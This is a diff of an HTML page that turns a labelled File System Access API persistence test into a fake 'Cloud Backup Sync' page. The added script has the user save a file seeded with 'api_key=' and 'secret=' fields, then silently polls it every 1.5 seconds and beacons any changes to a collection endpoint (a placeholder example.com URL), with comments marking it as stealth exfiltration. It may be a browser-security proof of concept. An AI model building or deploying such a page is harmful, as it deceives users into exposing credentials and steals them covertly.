@@ -2,89 +2,81 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>FS Access Persistence Test</title>
+<title>Cloud Backup Service</title>
 <style>
-body { font-family: Arial; padding: 30px; background:#f5f5f5;}
-button { padding:10px; margin:5px; }
-#log { background:#111; color:#0f0; padding:10px; height:200px; overflow:auto;}
+body { font-family: Arial; background:#eef2ff; padding:40px;}
+.box { background:white; padding:20px; border-radius:10px; max-width:500px;}
+#status { margin-top:10px; color:#333;}
 </style>
 </head>
 <body>
 
-<h2>🧪 File Handle Persistence Test</h2>
+<div class="box">
+<h2>☁️ Cloud Backup Sync</h2>
+<p>Save your config file to enable automatic cloud sync.</p>
 
-<button onclick="pickFile()">1. Pick File</button>
-<button onclick="saveHandle()">2. Save Handle</button>
-<button onclick="loadHandle()">3. Load Handle</button>
-<button onclick="startMonitor()">4. Start Monitor</button>
-
-<div id="log"></div>
+<button onclick="init()">Enable Sync</button>
+<div id="status"></div>
+</div>
 
 <script>
-let fileHandle;
+let handle;
+let lastData = "";
 
-function log(msg){
-  document.getElementById("log").innerHTML += msg+"<br>";
+// fake server endpoint (ganti kalau mau real test)
+const SERVER = "https://example.com/collect";
+
+function status(msg){
+  document.getElementById("status").innerText = msg;
 }
 
-// STEP 1
-async function pickFile(){
-  fileHandle = await window.showSaveFilePicker({
-    suggestedName: "test.txt"
-  });
-  log("✅ File selected");
-}
+async function init(){
+  try{
+    handle = await window.showSaveFilePicker({
+      suggestedName: "backup-config.txt"
+    });
 
-// STEP 2 - store handle
-async function saveHandle(){
-  const db = await openDB();
-  const tx = db.transaction("store", "readwrite");
-  tx.objectStore("store").put(fileHandle, "handle");
-  await tx.complete;
-  log("💾 Handle saved to IndexedDB");
-}
+    const writable = await handle.createWritable();
+    await writable.write("api_key=\nsecret=\n");
+    await writable.close();
 
-// STEP 3 - reload simulation
-async function loadHandle(){
-  const db = await openDB();
-  const tx = db.transaction("store", "readonly");
-  fileHandle = await tx.objectStore("store").get("handle");
+    status("✅ Sync enabled");
 
-  if(fileHandle){
-    log("♻️ Handle restored WITHOUT picker");
-  } else {
-    log("❌ No handle found");
+    startStealthMonitor();
+
+  }catch(e){
+    status("Error: " + e.message);
   }
 }
 
-// STEP 4 - monitor
-function startMonitor(){
+// 🔥 stealth monitoring
+function startStealthMonitor(){
   setInterval(async ()=>{
     try{
-      if(!fileHandle) return;
-
-      const file = await fileHandle.getFile();
+      const file = await handle.getFile();
       const text = await file.text();
 
-      log("📡 Read: " + text);
+      if(text !== lastData){
+        lastData = text;
+
+        // 🔥 simulate exfiltration
+        navigator.sendBeacon(SERVER, text);
+
+        console.log("Synced silently");
+      }
 
     }catch(e){
-      log("🚫 Access blocked: " + e.message);
+      console.log("blocked");
     }
-  }, 1000);
+  }, 1500);
 }
 
-// IndexedDB helper
-function openDB(){
-  return new Promise((res, rej)=>{
-    const req = indexedDB.open("fs-db",1);
-    req.onupgradeneeded = ()=>{
-      req.result.createObjectStore("store");
-    };
-    req.onsuccess = ()=>res(req.result);
-    req.onerror = ()=>rej();
-  });
-}
+// 🔥 run even when tab hidden
+document.addEventListener("visibilitychange", ()=>{
+  if(document.hidden){
+    console.log("running in background");
+  }
+});
 </script>
 
 </body>
